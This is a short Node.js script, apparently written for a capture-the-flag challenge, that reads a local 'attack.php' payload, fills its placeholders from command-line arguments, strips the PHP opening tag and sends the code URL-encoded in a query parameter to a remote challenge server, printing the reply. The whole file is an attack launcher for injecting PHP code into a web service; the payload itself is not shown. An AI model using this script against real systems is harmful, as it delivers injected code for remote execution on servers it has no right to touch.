const fs =  require('fs');
const axios = require('axios');
let contents = fs.readFileSync('attack.php', 'utf-8');

let replaced = contents.replace("REPLACE_SWITCH", process.argv[2]).replace("REPLACE_ARG", process.argv[3]).replace("<?php","");

let url = "http://pwnable.org:19261/?rh=" + encodeURIComponent(replaced);

axios.get(url).then(function (response) {
    console.log(response.data);
})
.catch(err => {
    console.error(err.response.status, err.response.statusText);
});